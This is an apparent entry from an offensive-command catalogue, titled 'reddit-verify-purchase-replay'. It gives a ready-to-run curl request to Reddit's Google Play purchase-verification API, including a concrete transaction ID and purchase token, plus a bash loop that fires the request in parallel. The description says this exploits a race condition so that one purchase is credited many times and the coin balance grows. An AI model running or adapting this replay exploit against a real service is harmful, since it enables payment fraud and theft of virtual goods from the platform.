---
data: >-
  curl -X POST
  'https://oauth.reddit.com/api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715'
  -H 'Authorization: Bearer REDACTED' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd'
tags:
  - api
  - replay
  - race-condition
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:22.518Z'
id: ba2ff9a0-889d-49f1-a8f6-ea20dc63e184
verified: false
validated: true
submitted: true
---
# reddit-verify-purchase-replay

## Command

```bash
curl -X POST 'https://oauth.reddit.com/api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715' \
  -H 'Authorization: Bearer REDACTED' \
  -H 'Client-Vendor-ID: REDACTED' \
  -H 'x-reddit-device-id: REDACTED' \
  -H 'User-Agent: Reddit/Version 2020.5.0/Build 255357/Android 9' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd'
```

## Description

Sends a POST request to verify a Google Play coin purchase on Reddit's API, crediting coins to the user account. Used in race condition exploits by replaying multiple times.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `transaction_id` | Google Play transaction ID | Yes |
| `token` | Purchase token from Google Play | Yes |
| `package_name` | App package (com.reddit.frontpage) | Yes |
| `product_id` | Coin product (com.reddit.coins_1) | Yes |
| `correlation_id` | Unique request ID | Yes |
| `Authorization` | Bearer token from Reddit session | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://oauth.reddit.com/api/v2/gold/android/verify_purchase' -H 'Authorization: Bearer TOKEN' -d 'transaction_id=ID&token=TOKEN&...'
```

### Advanced Usage (Parallel)

```bash
for i in {1..10}; do curl ... & done; wait
```

## Expected Output

JSON response with success: {"json": {"errors": [], "data": {"coins": 50}}}, crediting 50 coins. In race exploit, multiple successes inflate balance.

## Related

- [[procedures/Replay-Verification-Request-in-Parallel]]
